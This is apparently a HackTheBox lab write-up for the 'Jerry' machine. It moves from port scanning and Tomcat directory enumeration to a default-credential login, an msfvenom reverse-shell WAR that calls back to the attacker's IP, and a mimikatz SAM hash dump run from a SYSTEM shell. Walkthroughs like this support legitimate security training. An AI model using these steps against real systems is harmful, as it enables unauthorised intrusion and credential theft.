# Jerry | HackTheBox

### 1. Scan
```
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-x66zuu7qsr]─[~]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.70.189
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-28 13:46 UTC
Nmap scan report for 10.129.70.189
Host is up (0.22s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 (90%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   222.78 ms 10.10.14.1
2   222.90 ms 10.129.70.189

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 224.33 seconds
```
The machine is running Apache Tomcat on port 8080.

### 2. Enumeration
Going to "server status" on the Tomcat page in the web browser shows that Tomcat is running JTB version 1.8.0_171-b11 and the operating system in Windows Server 2012 R2, 64-bit. The machine's hostname is JERRY.  
Running a disbust using a tomcat wordlist:
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-x66zuu7qsr]─[~]
└──╼ [★]$ gobuster dir -u http://10.129.70.189:8080 -w /usr/share/dirb/wordlists/vulns/tomcat.txt -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.129.70.189:8080
[+] Threads:        20
[+] Wordlist:       /usr/share/dirb/wordlists/vulns/tomcat.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/28 14:01:40 Starting gobuster
===============================================================
/examples (Status: 302)
/host-manager (Status: 302)
/manager (Status: 302)
/examples/servlets/index.html (Status: 200)
/examples/jsp/index.html (Status: 200)
/manager/html (Status: 401)
/manager/html/* (Status: 401)
/manager/jmxproxy (Status: 401)
/manager/jmxproxy/* (Status: 401)
/manager/status/* (Status: 401)
/manager/status.xsd (Status: 200)
/host-manager/html/* (Status: 401)
/examples/jsp/snp/snoop.jsp (Status: 200)
===============================================================
2020/12/28 14:01:45 Finished
===============================================================
```
Among the exposed directories is the manager page, but it needs a login. By trying the default credentials for Tomcat, I can get logged in with `tomcat:s3cret`.

### 3. Get a system shell
Through the manager panel I can deploy web applications by uploading a war file. Generate an app to give me a reverse shell:
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-eolbqcu7pq]─[~]
└──╼ [★]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.162 LPORT=9999 -f war > webshell.war
Payload size: 1090 bytes
Final size of war file: 1090 bytes
```
Then upload the war file via the admin panel. It is automatically deployed to /webshell.
Access the app to trigger the shell.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-eolbqcu7pq]─[~]
└──╼ [★]$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.162] from (UNKNOWN) [10.129.1.110] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
nt authority\system

C:\apache-tomcat-7.0.88>copy \\10.10.14.162\jack\mimikatz.exe .\meow.exe
        1 file(s) copied.

C:\apache-tomcat-7.0.88>.\meow.exe "lsadump::sam" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::sam
Domain : JERRY
SysKey : 777873202c520da6e5ce6f10e419892b
Local SID : S-1-5-21-2323042369-1334567395-6350930

SAMKey : f9949362f1f1bada77d23e7d6370d3d6

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: fe34b627386c89a49eb254f6a267e4d9

RID  : 000001f5 (501)
User : Guest

mimikatz(commandline) # exit
Bye!
```
